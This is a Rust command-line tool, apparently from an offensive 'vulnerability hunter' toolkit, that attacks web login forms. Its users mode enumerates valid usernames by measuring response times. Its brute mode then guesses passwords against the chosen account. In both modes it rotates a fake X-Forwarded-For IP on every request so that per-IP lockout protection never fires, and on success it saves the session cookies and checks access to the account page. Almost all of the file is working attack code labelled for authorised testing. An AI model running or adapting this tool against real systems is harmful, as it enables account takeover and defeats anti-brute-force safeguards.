#!/usr/bin/env rust-script
//! name: timing_enum
//! description: 登录端时序枚举与口令爆破件(响应耗时 oracle + 按请求轮换客户端 IP 头绕开按 IP 计的爆破保护)- users 模式对候选用户名各投递 N 次超长口令取中位耗时排名,brute 模式对命中用户名扫候选口令并回写会话 jar + 账户页复验;一个信封给出排名表/中选口令与命中证据。合法授权测试用途。
//! version: 1.0.0
//! args: users <login-url> --users FILE [--password PW] [--reps 3] [--field-user username] [--field-pass password] [--ip-header X-Forwarded-For] [--header 'K: V']... [--top 10] [--timeout-ms N] [--selftest] | brute <login-url> --user U --passwords FILE [--jar PATH] [--confirm-path /my-account] [--fail-marker 'Invalid username or password'] [--block-marker S] [--snippet N] [--selftest]
//! keywords: 漏洞猎手套件, 认证, 用户名枚举, 时序, timing, response-time, user-enumeration, 爆破保护, x-forwarded-for, ip-rotate, password
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

const LONG_PASSWORD: &str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

struct Cfg {
    mode: String,
    url: String,
    users: Vec<String>,
    passwords: Vec<String>,
    user: String,
    password: String,
    reps: usize,
    field_user: String,
    field_pass: String,
    ip_header: String,
    headers: Vec<(String, String)>,
    jar_path: Option<String>,
    confirm_path: Option<String>,
    fail_marker: String,
    block_marker: String,
    top: usize,
    snippet: usize,
    timeout_ms: u64,
}

struct Reply {
    status: u16,
    location: String,
    set_cookies: Vec<String>,
    body: String,
    ms: u128,
    transport_err: Option<String>,
}

/// Per-request fake client addresses. A fresh address per request keeps any
/// IP-keyed failed-login counter at zero, which is what makes an unhurried
/// 100-candidate sweep possible.
struct Rotator {
    n: u64,
}

impl Rotator {
    fn new() -> Self {
        Rotator { n: 0 }
    }
    fn next_ip(&mut self) -> String {
        self.n += 1;
        let n = self.n;
        format!("10.{}.{}.{}", (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff)
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        mode: String::new(),
        url: String::new(),
        users: Vec::new(),
        passwords: Vec::new(),
        user: String::new(),
        password: LONG_PASSWORD.to_string(),
        reps: 3,
        field_user: "username".to_string(),
        field_pass: "password".to_string(),
        ip_header: "X-Forwarded-For".to_string(),
        headers: Vec::new(),
        jar_path: None,
        confirm_path: Some("/my-account".to_string()),
        fail_marker: "Invalid username or password".to_string(),
        block_marker: "too many incorrect login attempts".to_string(),
        top: 10,
        snippet: 200,
        timeout_ms: 20000,
    };
    let mut users_file: Option<String> = None;
    let mut pass_file: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--users" => { i += 1; users_file = Some(arg(&args, i)); }
            "--passwords" => { i += 1; pass_file = Some(arg(&args, i)); }
            "--user" => { i += 1; cfg.user = arg(&args, i); }
            "--password" => { i += 1; cfg.password = arg(&args, i); }
            "--reps" => { i += 1; cfg.reps = arg(&args, i).parse().unwrap_or(3).max(1); }
            "--field-user" => { i += 1; cfg.field_user = arg(&args, i); }
            "--field-pass" => { i += 1; cfg.field_pass = arg(&args, i); }
            "--ip-header" => { i += 1; cfg.ip_header = arg(&args, i); }
            "--header" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once(':') {
                    cfg.headers.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--jar" => { i += 1; cfg.jar_path = Some(arg(&args, i)); }
            "--confirm-path" => { i += 1; cfg.confirm_path = Some(arg(&args, i)); }
            "--fail-marker" => { i += 1; cfg.fail_marker = arg(&args, i); }
            "--block-marker" => { i += 1; cfg.block_marker = arg(&args, i); }
            "--top" => { i += 1; cfg.top = arg(&args, i).parse().unwrap_or(10).max(1); }
            "--snippet" => { i += 1; cfg.snippet = arg(&args, i).parse().unwrap_or(200); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = arg(&args, i).parse().unwrap_or(20000); }
            other if !other.starts_with("--") && cfg.mode.is_empty() => cfg.mode = other.to_string(),
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if let Some(path) = users_file {
        match read_list(&path) {
            Ok(v) => cfg.users = v,
            Err(e) => fail(&format!("cannot read --users {path}: {e}")),
        }
    }
    if let Some(path) = pass_file {
        match read_list(&path) {
            Ok(v) => cfg.passwords = v,
            Err(e) => fail(&format!("cannot read --passwords {path}: {e}")),
        }
    }
    if cfg.url.is_empty() || (cfg.mode != "users" && cfg.mode != "brute") {
        fail("usage: timing_enum users <login-url> --users FILE | timing_enum brute <login-url> --user U --passwords FILE");
    }
    if cfg.mode == "users" && cfg.users.is_empty() {
        fail("users mode needs --users FILE");
    }
    if cfg.mode == "brute" && (cfg.user.is_empty() || cfg.passwords.is_empty()) {
        fail("brute mode needs --user U and --passwords FILE");
    }

    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_millis(cfg.timeout_ms))
        .redirects(0)
        .build();
    let mut rot = Rotator::new();

    if cfg.mode == "users" {
        run_users(&agent, &cfg, &mut rot);
    } else {
        run_brute(&agent, &cfg, &mut rot);
    }
}

fn run_users(agent: &ureq::Agent, cfg: &Cfg, rot: &mut Rotator) {
    let started = Instant::now();
    let mut results: Vec<Value> = Vec::new();
    let mut errors = 0usize;
    for user in &cfg.users {
        let mut times: Vec<u128> = Vec::new();
        let mut statuses: Vec<u16> = Vec::new();
        for _ in 0..cfg.reps {
            let ip = rot.next_ip();
            let reply = login(agent, cfg, user, &cfg.password, &ip, "");
            match reply.transport_err {
                Some(_) => errors += 1,
                None => {
                    times.push(reply.ms);
                    statuses.push(reply.status);
                }
            }
        }
        if times.is_empty() {
            results.push(json!({"username": user, "median_ms": Value::Null, "error": "all requests failed"}));
            continue;
        }
        let med = median(&mut times.clone());
        let min = *times.iter().min().unwrap_or(&0);
        let max = *times.iter().max().unwrap_or(&0);
        results.push(json!({
            "username": user,
            "median_ms": med,
            "min_ms": min,
            "max_ms": max,
            "times_ms": times,
            "statuses": statuses,
        }));
    }
    results.sort_by(|a, b| {
        let av = a["median_ms"].as_u64().unwrap_or(0);
        let bv = b["median_ms"].as_u64().unwrap_or(0);
        bv.cmp(&av)
    });
    for (idx, r) in results.iter_mut().enumerate() {
        r["rank"] = json!(idx + 1);
    }
    let top = results.first().cloned().unwrap_or(Value::Null);
    let second_ms = results.get(1).and_then(|r| r["median_ms"].as_u64()).unwrap_or(0);
    let top_ms = top["median_ms"].as_u64().unwrap_or(0);
    let runner_up_ms = second_ms;
    let data = json!({
        "url": cfg.url,
        "mode": "users",
        "reps": cfg.reps,
        "password_len": cfg.password.chars().count(),
        "ip_header": cfg.ip_header,
        "candidates": cfg.users.len(),
        "transport_errors": errors,
        "elapsed_ms": started.elapsed().as_millis() as u64,
        "ranked": results.iter().take(cfg.top).cloned().collect::<Vec<_>>(),
        "all_medians": results.iter().map(|r| json!({"username": r["username"], "median_ms": r["median_ms"]})).collect::<Vec<_>>(),
        "likely_valid": top["username"].clone(),
        "top_delta_ms": top_ms.saturating_sub(runner_up_ms),
    });
    pi_rust_lib::report::success(
        "timing_enum",
        data,
        "take likely_valid and run: timing_enum brute <login-url> --user <likely_valid> --passwords FILE --jar JAR (raise --reps if top_delta_ms is small)",
    )
    .expect("report");
}

fn run_brute(agent: &ureq::Agent, cfg: &Cfg, rot: &mut Rotator) {
    let started = Instant::now();
    let mut jar: Jar = cfg.jar_path.as_deref().map(load_jar).unwrap_or_default();
    let mut attempts = 0usize;
    let mut blocked = 0usize;
    let mut errors = 0usize;
    let mut tail: Vec<Value> = Vec::new();
    let mut hit: Option<Value> = None;

    for pw in &cfg.passwords {
        let ip = rot.next_ip();
        let cookie = cookie_header(&jar, &cfg.url);
        let reply = login(agent, cfg, &cfg.user, pw, &ip, &cookie);
        attempts += 1;
        if let Some(e) = &reply.transport_err {
            errors += 1;
            if tail.len() < 40 {
                tail.push(json!({"password": pw, "transport": e}));
            }
            continue;
        }
        let set: Vec<(String, String)> = reply.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
        apply_setcookies(&mut jar, &cfg.url, &set);
        if !cfg.block_marker.is_empty() && reply.body.to_lowercase().contains(&cfg.block_marker.to_lowercase()) {
            blocked += 1;
            if tail.len() < 40 {
                tail.push(json!({"password": pw, "blocked": true, "status": reply.status}));
            }
            continue;
        }
        if is_hit(reply.status, &reply.body, &cfg.fail_marker, set.len()) {
            hit = Some(json!({
                "password": pw,
                "status": reply.status,
                "location": reply.location,
                "set_cookie_names": set.iter().map(|(k, _)| k.clone()).collect::<Vec<_>>(),
                "ms": reply.ms,
                "snippet": collapse(&reply.body, cfg.snippet),
            }));
            break;
        }
        if tail.len() < 40 {
            tail.push(json!({"password": pw, "status": reply.status, "ms": reply.ms}));
        }
    }

    let mut confirm = Value::Null;
    let mut jar_updated = false;
    if hit.is_some() {
        if let Some(path) = cfg.confirm_path.as_deref() {
            let cookie = cookie_header(&jar, &cfg.url);
            let target = match Url::parse(&cfg.url) {
                Ok(mut u) => {
                    u.set_path(path);
                    u.set_query(None);
                    u.to_string()
                }
                Err(_) => format!("{}{}", cfg.url.trim_end_matches('/'), path),
            };
            let follow = ureq::AgentBuilder::new()
                .timeout(Duration::from_millis(cfg.timeout_ms))
                .redirects(2)
                .build();
            let reply = get_plain(&follow, &target, &cookie);
            confirm = json!({
                "path": path,
                "status": reply.status,
                "authenticated": reply.status == 200 && (reply.body.contains("Your username is") || reply.body.contains("/logout")),
                "final_snippet": collapse(&reply.body, cfg.snippet),
            });
        }
        if let Some(jar_path) = cfg.jar_path.as_deref() {
            if let Ok(text) = pi_rust_lib::serde_json::to_string(&jar) {
                jar_updated = std::fs::write(jar_path, text).is_ok();
            }
        }
    }

    let data = json!({
        "url": cfg.url,
        "mode": "brute",
        "user": cfg.user,
        "candidates": cfg.passwords.len(),
        "attempts": attempts,
        "transport_errors": errors,
        "blocked_responses": blocked,
        "elapsed_ms": started.elapsed().as_millis() as u64,
        "hit": hit,
        "confirm": confirm,
        "jar_updated": jar_updated,
        "tail": tail,
    });
    if data["hit"].is_null() {
        pi_rust_lib::report::success(
            "timing_enum",
            data,
            "no candidate matched; verify --fail-marker against the real error text or widen the candidate list",
        )
        .expect("report");
    } else {
        pi_rust_lib::report::success(
            "timing_enum",
            data,
            "confirm.authenticated proves the credential; the jar holds the session - keep going via http_session --jar / banner_verdict",
        )
        .expect("report");
    }
}

fn login(agent: &ureq::Agent, cfg: &Cfg, user: &str, password: &str, ip: &str, cookie: &str) -> Reply {
    let mut headers = cfg.headers.clone();
    if !cfg.ip_header.is_empty() {
        headers.push((cfg.ip_header.clone(), ip.to_string()));
    }
    let body = form_body(&[
        (cfg.field_user.clone(), user.to_string()),
        (cfg.field_pass.clone(), password.to_string()),
    ]);
    let mut req = agent.post(&cfg.url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    for (k, v) in &headers {
        req = req.set(k, v);
    }
    let start = Instant::now();
    match req.send_string(&body) {
        Ok(r) | Err(ureq::Error::Status(_, r)) => {
            let ms = start.elapsed().as_millis();
            let mut reply = read(r);
            reply.ms = ms;
            reply
        }
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            ms: start.elapsed().as_millis(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn get_plain(agent: &ureq::Agent, url: &str, cookie: &str) -> Reply {
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.call() {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            ms: 0,
            transport_err: Some(e.to_string()),
        },
    }
}

fn read(r: ureq::Response) -> Reply {
    let status = r.status();
    let location = r.header("Location").unwrap_or("").to_string();
    let set_cookies: Vec<String> = r.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = r.into_string().unwrap_or_default();
    Reply { status, location, set_cookies, body, ms: 0, transport_err: None }
}

fn median(values: &mut Vec<u128>) -> u64 {
    values.sort_unstable();
    let n = values.len();
    if n == 0 {
        return 0;
    }
    if n % 2 == 1 {
        values[n / 2] as u64
    } else {
        ((values[n / 2 - 1] + values[n / 2]) / 2) as u64
    }
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn fail(msg: &str) -> ! {
    pi_rust_lib::report::failure("timing_enum", msg, "see the args line: users <url> --users FILE | brute <url> --user U --passwords FILE");
    std::process::exit(2);
}

fn read_list(path: &str) -> std::io::Result<Vec<String>> {
    Ok(std::fs::read_to_string(path)?
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(String::from)
        .collect())
}

/// A 3xx after the credential POST is the success redirect. A 200 only counts
/// when the failure marker is absent AND a cookie was set: an unmatched
/// --fail-marker plus no cookie means the marker is wrong, not that the
/// credential worked, so it must not fabricate a hit. The confirm leg keys on a
/// POSITIVE account-page marker ("Your username is" / "/logout"), never on the
/// absence of "login-form" - the account page renders its own login-form.
fn is_hit(status: u16, body: &str, fail_marker: &str, set_cookie_count: usize) -> bool {
    if (300..400).contains(&status) {
        return true;
    }
    !fail_marker.is_empty() && !body.contains(fail_marker) && set_cookie_count > 0
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn form_body(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| format!("{}={}", urlencode(k), urlencode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn host_of(url: &str) -> String {
    Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default()
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = host_of(url);
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn apply_setcookies(jar: &mut Jar, url: &str, pairs: &[(String, String)]) -> bool {
    if pairs.is_empty() {
        return false;
    }
    let host = host_of(url);
    let key = jar
        .keys()
        .find(|h| **h == host || host.ends_with(&format!(".{h}")) || h.ends_with(&host))
        .cloned()
        .unwrap_or(host);
    let entry = jar.entry(key).or_default();
    for (k, v) in pairs {
        entry.insert(k.clone(), v.clone());
    }
    true
}

fn split_cookie(raw: &str) -> Option<(String, String)> {
    let first = raw.split(';').next()?.trim();
    let (k, v) = first.split_once('=')?;
    Some((k.trim().to_string(), v.trim().to_string()))
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| pi_rust_lib::serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let mut rot = Rotator::new();
    let ip_a = rot.next_ip();
    let ip_b = rot.next_ip();
    let ip_ok = ip_a == "10.0.0.1" && ip_b == "10.0.0.2";
    let med_ok = median(&mut vec![10, 30, 20]) == 20 && median(&mut vec![10, 20]) == 15;
    let body_ok = form_body(&[("username".into(), "a b".into()), ("password".into(), "x".into())])
        == "username=a%20b&password=x";
    let oracle_ok = is_hit(302, "", "Invalid username or password", 0)
        && !is_hit(200, "<p>Invalid username or password</p>", "Invalid username or password", 1)
        && !is_hit(200, "account page", "Invalid username or password", 0)
        && is_hit(200, "account page", "Invalid username or password", 1);
    let mut jar: Jar = BTreeMap::new();
    let jar_ok = apply_setcookies(&mut jar, "https://lab.example.net/login", &[("session".into(), "b".into())])
        && cookie_header(&jar, "https://lab.example.net/login") == "session=b";
    let split_ok = split_cookie("session=zz; Secure") == Some(("session".to_string(), "zz".to_string()));
    let collapse_ok = collapse("a\n b", 10) == "a b";
    let host_ok = host_of("https://lab.example.net/login") == "lab.example.net";
    let receipt = ip_ok && med_ok && body_ok && oracle_ok && jar_ok && split_ok && collapse_ok && host_ok;
    let data = json!({
        "selftest": if receipt {"ok"} else {"fail"},
        "ip_rotation": ip_ok,
        "median": med_ok,
        "form_body": body_ok,
        "oracle": oracle_ok,
        "cookie_jar": jar_ok,
        "split_cookie": split_ok,
        "collapse": collapse_ok,
        "host": host_ok,
    });
    if receipt {
        pi_rust_lib::report::success("timing_enum", data, "selftest passed; run users mode against the login endpoint").expect("report");
    } else {
        pi_rust_lib::report::failure("timing_enum", "selftest failed", "inspect the failing assertion flags");
        std::process::exit(1);
    }
}
